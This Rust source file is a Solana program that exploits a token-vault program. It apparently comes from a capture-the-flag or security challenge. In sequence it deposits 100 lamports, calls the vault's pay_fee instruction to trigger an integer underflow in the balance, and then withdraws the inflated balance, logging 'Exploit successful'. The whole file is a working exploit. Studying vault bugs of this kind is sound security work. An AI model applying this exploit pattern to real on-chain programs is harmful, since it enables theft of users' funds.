use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::AccountInfo,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    msg,
    program::invoke,
    pubkey::Pubkey,
    system_program,
};

#[derive(BorshSerialize, BorshDeserialize, Debug)]
pub enum VaultInstruction {
    Initialize { vault_bump: u8 },
    Deposit { amount: u64 },
    Withdraw,
    PayFee,
}

fn deposit(program_id: Pubkey, user: Pubkey, amount: u64) -> Instruction {
    let (vault, _) = Pubkey::find_program_address(&[b"VAULT", user.as_ref()], &program_id);
    Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(vault, false),
            AccountMeta::new(user, true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: VaultInstruction::Deposit { amount }.try_to_vec().unwrap(),
    }
}

fn withdraw(program_id: Pubkey, user: Pubkey) -> Instruction {
    let (vault, _) = Pubkey::find_program_address(&[b"VAULT", user.as_ref()], &program_id);
    Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(vault, false),
            AccountMeta::new(user, true),
        ],
        data: VaultInstruction::Withdraw.try_to_vec().unwrap(),
    }
}

fn pay_fee(program_id: Pubkey, user: Pubkey) -> Instruction {
    let (vault, _) = Pubkey::find_program_address(&[b"VAULT", user.as_ref()], &program_id);
    Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(user, true),
        ],
        data: VaultInstruction::PayFee.try_to_vec().unwrap(),
    }
}

solana_program::entrypoint!(process);

pub fn process(_program_id: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    use solana_program::account_info::next_account_info;
    
    msg!("Starting Token Vault exploit");
    
    let account_iter = &mut accounts.iter();
    let vault_account = next_account_info(account_iter)?;
    let user_account = next_account_info(account_iter)?;
    let vault_program = next_account_info(account_iter)?;
    let system_program_account = next_account_info(account_iter)?;
    
    msg!("Vault Program: {}", vault_program.key);
    msg!("User: {}", user_account.key);
    msg!("Vault PDA: {}", vault_account.key);
    
    msg!("Step 1: Depositing 100 lamports to reach VIP status");
    invoke(
        &deposit(*vault_program.key, *user_account.key, 100),
        &[vault_account.clone(), user_account.clone(), system_program_account.clone()],
    )?;
    msg!("Deposit complete. Vault balance now >= 100");
    
    msg!("Step 2: Triggering integer underflow via pay_fee");
    invoke(
        &pay_fee(*vault_program.key, *user_account.key),
        &[vault_account.clone(), user_account.clone()],
    )?;
    msg!("Underflow triggered");
    
    msg!("Step 3: Withdrawing the massive balance");
    invoke(
        &withdraw(*vault_program.key, *user_account.key),
        &[vault_account.clone(), user_account.clone()],
    )?;
    msg!("Withdrawal complete");
    
    msg!("Exploit successful");
    Ok(())
}

